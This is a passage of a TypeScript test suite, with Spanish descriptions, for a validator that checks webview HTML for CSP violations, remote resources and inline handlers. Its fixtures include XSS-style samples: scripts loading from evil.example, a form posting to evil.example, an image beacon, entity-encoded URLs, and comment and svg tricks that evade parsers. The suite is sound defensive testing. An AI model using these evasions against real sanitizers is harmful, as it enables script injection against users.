            <body><script nonce="${nonce}" src=https://evil.example/x.js></script></body></html>`;
        expect(findWebviewHtmlViolations(html)).toEqual([
            'recurso remoto en <script src>: "https://evil.example/x.js"'
        ]);
    });

    test('handler inline sin comillas es violación', () => {
        expect(findWebviewHtmlViolations(doc('<div onclick=alert(1)></div>')))
            .toContainEqual(expect.stringContaining('handler inline presente'));
        // y con backtick, y con mayúsculas en el nombre del atributo
        expect(findWebviewHtmlViolations(doc('<div ONCLICK=alert(1)></div>')))
            .toContainEqual(expect.stringContaining('handler inline presente'));
    });

    test('style= sin comillas es violación', () => {
        expect(findWebviewHtmlViolations(doc('<div style=color:red></div>')))
            .toContainEqual(expect.stringContaining('atributo style= inline presente'));
    });

    test('link/iframe/form sin comillas también caen', () => {
        expect(findWebviewHtmlViolations(doc('<link rel=stylesheet href=https://evil.example/a.css>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <link href>'));
        expect(findWebviewHtmlViolations(doc('<iframe src=https://evil.example/></iframe>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <iframe src>'));
        expect(findWebviewHtmlViolations(doc('<form action=https://evil.example/rob></form>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <form action>'));
    });

    test('un documento con atributo sin cerrar se RECHAZA, no se aprueba', () => {
        const roto = `<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy" content="default-src 'none';"></head><body><script nonce="abc src=x></script></body></html>`;
        expect(findWebviewHtmlViolations(roto)[0]).toMatch(/documento no analizable, se rechaza/);
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · DD5 — comentarios: el análisis debe coincidir con el navegador
// ---------------------------------------------------------------------------

describe('WP-V66 · DD5 · comentarios sincronizados con el tokenizador', () => {
    test('`<!-->` cierra el comentario ahí (abrupt-closing), no en el `-->` siguiente', () => {
        // Para el navegador el comentario es sólo `<!-->`: el <script> de después
        // ES marcado vivo. La regex anterior se comía hasta el `-->` final y no
        // veía nada.
        const html = `<!DOCTYPE html><html><head>
            <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
            </head><body><!--><script src="https://evil.example/x.js"></script><!-- --></body></html>`;
        const v = findWebviewHtmlViolations(html);
        expect(v).toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
        expect(v).toContainEqual(expect.stringContaining('<script> sin nonce'));
    });

    test('`<!--->` también cierra ahí', () => {
        const tags = scanHtml('<!---><div onclick=x></div>').tags;
        expect(tags.map(t => t.name)).toContain('div');
    });

    test('`<!--` dentro de un valor de atributo NO abre comentario', () => {
        // El tokenizador está en estado "valor de atributo entrecomillado":
        // el `<!--` es texto del atributo. La regex anterior sí abría comentario
        // y borraba del análisis todo lo que venía detrás.
        const html = `<!DOCTYPE html><html><head>
            <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
            </head><body><div title="<!--"></div>
            <script src="https://evil.example/x.js"></script>
            <div title="-->"></div></body></html>`;
        const v = findWebviewHtmlViolations(html);
        expect(v).toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
    });

    test('un comentario de verdad sí se ignora (no es rechazo indiscriminado)', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ styleNonce: nonce })}
            <!-- comentario normal, con <script> dentro que no es marcado -->
            </head><body><h2>ok</h2></body></html>`;
        expect(findWebviewHtmlViolations(html)).toEqual([]);
    });

    test('un comentario sin cerrar RECHAZA el documento', () => {
        const html = `<!DOCTYPE html><html><head>
            <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
            </head><body><!-- sin cerrar</body></html>`;
        expect(findWebviewHtmlViolations(html)[0]).toMatch(/documento no analizable, se rechaza/);
    });

    test('el contenido de <script>/<style> no se re-tokeniza', () => {
        // un `<div onclick=…>` dentro de una cadena JS no es un handler
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body><script nonce="${nonce}">const s = "<div onclick=x>";</script></body></html>`;
        expect(findWebviewHtmlViolations(html)).toEqual([]);
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D-1 — referencias de carácter en valores de atributo
// ---------------------------------------------------------------------------

describe('WP-V66 · D-1 · referencias de carácter en atributos', () => {
    const doc = (body: string) => {
        const nonce = createNonce();
        return `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body>${body.replace(/__NONCE__/g, nonce)}</body></html>`;
    };

    test('el decodificador resuelve numéricas, hex y con nombre', () => {
        expect(decodeAttributeValue('&#104;ttps://evil.example/x.js').value).toBe('https://evil.example/x.js');
        expect(decodeAttributeValue('&#x68;ttps://evil.example/x.js').value).toBe('https://evil.example/x.js');
        expect(decodeAttributeValue('&Tab;https://evil.example').value).toBe('\thttps://evil.example');
        expect(decodeAttributeValue('javascript&colon;alert(1)').value).toBe('javascript:alert(1)');
        // sin `;` también son válidas las numéricas
        expect(decodeAttributeValue('&#104ttps').value).toBe('https');
    });

    test('regla heredada: nombre sin `;` seguido de `=` o alfanumérico NO se decodifica', () => {
        expect(decodeAttributeValue('&ltfoo').value).toBe('&ltfoo');
        expect(decodeAttributeValue('&lt=x').value).toBe('&lt=x');
        expect(decodeAttributeValue('&lt/foo').value).toBe('</foo');
    });

    test('una referencia con nombre desconocida se marca NO resuelta, no se adivina', () => {
        const r = decodeAttributeValue('&noexiste;https://x');
        expect(r.unresolved).toBe(true);
        expect(r.value).toBe('&noexiste;https://x');
    });

    test('<script src="&#104;ttps://…"> es violación (el vector del informe)', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body><script nonce="${nonce}" src="&#104;ttps://evil.example/x.js"></script></body></html>`;
        expect(findWebviewHtmlViolations(html)).toEqual([
            'recurso remoto en <script src>: "https://evil.example/x.js"'
        ]);
    });

    test('las variantes hex, &Tab; y la baliza <img> también caen', () => {
        expect(findWebviewHtmlViolations(doc('<script nonce=__NONCE__ src="&#x68;ttps://evil.example/x.js"></script>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
        expect(findWebviewHtmlViolations(doc('<script nonce=__NONCE__ src="&Tab;https://evil.example/x.js"></script>')))
            .toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
        expect(findWebviewHtmlViolations(doc('<img src="&#104;ttps://evil.example/beacon.gif">')))
            .toContainEqual(expect.stringContaining('recurso remoto en <img src>'));
    });

    test('una referencia no resoluble en una URL se rechaza, no se aprueba', () => {
        expect(findWebviewHtmlViolations(doc('<img src="&desconocida;/x.gif">')))
            .toContainEqual(expect.stringContaining('referencia de carácter no resoluble en <img src>'));
    });

    test('`&amp;` en una query NO es falso positivo', () => {
        expect(findWebviewHtmlViolations(doc('<img src="media/a.gif?x=1&amp;y=2">'))).toEqual([]);
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D-2 — contenido extranjero: se rechaza, no se emula
// ---------------------------------------------------------------------------

describe('WP-V66 · D-2 · <svg>/<math> rechazados fail-closed', () => {
    test('el vector: <svg><title> esconde marcado real al escáner', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body><svg><title><div></div><script nonce="${nonce}" src="https://evil.example/x.js"></script></title></svg></body></html>`;
        expect(findWebviewHtmlViolations(html)[0]).toMatch(/contenido extranjero <svg> no soportado/);
    });

    test('<math> igual', () => {
        expect(scanHtml('<math><mi>x</mi></math>').errors[0]).toMatch(/contenido extranjero <math>/);
    });

    test('ninguno de los 25 puntos de render propios usa SVG/MathML inline', () => {
        for (const entry of CENSO) {
            expect(scanHtml(entry.render()).errors).toEqual([]);
        }
    });
});

// ---------------------------------------------------------------------------
// D-3 y D-4 · dos falsos positivos que había que quitar
// ---------------------------------------------------------------------------

describe('WP-V66 · D-3/D-4 · sin falsos positivos', () => {
    test('D-3 · <script/> entra en RAWTEXT: su cuerpo no es marcado', () => {
        const nonce = createNonce();
        // el navegador ignora el `/` y trata todo hasta </script> como texto;
        // tokenizarlo como marcado inventaba un handler inline que no existe
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
            <body><script nonce="${nonce}"/>var s = '<div onclick=x>';</script></body></html>`;
        expect(findWebviewHtmlViolations(html)).toEqual([]);
    });

    test('D-4 · <form action=""> es HTML válido, no un recurso remoto', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ styleNonce: nonce })}</head>
            <body><form action=""></form><img src=""></body></html>`;
        expect(findWebviewHtmlViolations(html)).toEqual([]);
    });
});

// ---------------------------------------------------------------------------
// srcdoc · decisión: se estrecha la entrada
// ---------------------------------------------------------------------------

describe('WP-V66 · srcdoc no admitido', () => {
    test('un <iframe srcdoc> se rechaza en vez de dejarlo sin inspeccionar', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>${buildCspMeta({ styleNonce: nonce })}</head>
            <body><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe></body></html>`;
        expect(findWebviewHtmlViolations(html))
            .toContainEqual(expect.stringContaining('srcdoc> no admitido'));
    });
});

// ---------------------------------------------------------------------------
// DD4/DD5 · la ruta de disco no depende de que el análisis sea perfecto
// ---------------------------------------------------------------------------

describe('WP-V66 · la ruta de disco va sin scripts (capa que no depende del parser)', () => {
    const src = require('fs').readFileSync(path.join(SRC_ROOT, 'webViewManager.ts'), 'utf8');

    test('un localPath deniega scripts aunque la config los pida', () => {
        expect(src).toContain('enableScripts: config.enableScripts === true && !config.localPath');
    });

    test('getDriverUIConfig ya no pide scripts para HTML de un repo vecino', () => {
        const desde = src.indexOf('getDriverUIConfig');
        const codigo = src
            .slice(desde, desde + 900)
            .split('\n')
            .filter((l: string) => !l.trim().startsWith('//'))
            .join('\n');
        const bloque = codigo.slice(0, codigo.indexOf('}'));
        expect(bloque).toContain('enableScripts: false');
        expect(bloque).not.toContain('enableScripts: true');
    });
});

// ---------------------------------------------------------------------------
// CASOS ROJOS · D5 — la SEGUNDA meta CSP también se mira
// ---------------------------------------------------------------------------

describe('WP-V66 · D5 · se validan TODAS las metas CSP, no la primera', () => {
    test('una segunda meta permisiva pone el documento en rojo', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>
            ${buildCspMeta({ scriptNonce: nonce })}
            <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'">
            </head><body></body></html>`;
        expect(extractCspMetaContents(html)).toHaveLength(2);
        expect(findWebviewHtmlViolations(html).length).toBeGreaterThan(0);
        expect(isSafeWebviewHtml(html)).toBe(false);
    });

    test('una segunda meta con fuente externa también cae', () => {
        const nonce = createNonce();
        const html = `<!DOCTYPE html><html><head>
            ${buildCspMeta({ scriptNonce: nonce })}
            <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src https://tracker.example;">
            </head><body></body></html>`;
        expect(findWebviewHtmlViolations(html))
            .toContainEqual(expect.stringContaining('fuente no admitida en CSP: "https://tracker.example"'));
    });
});
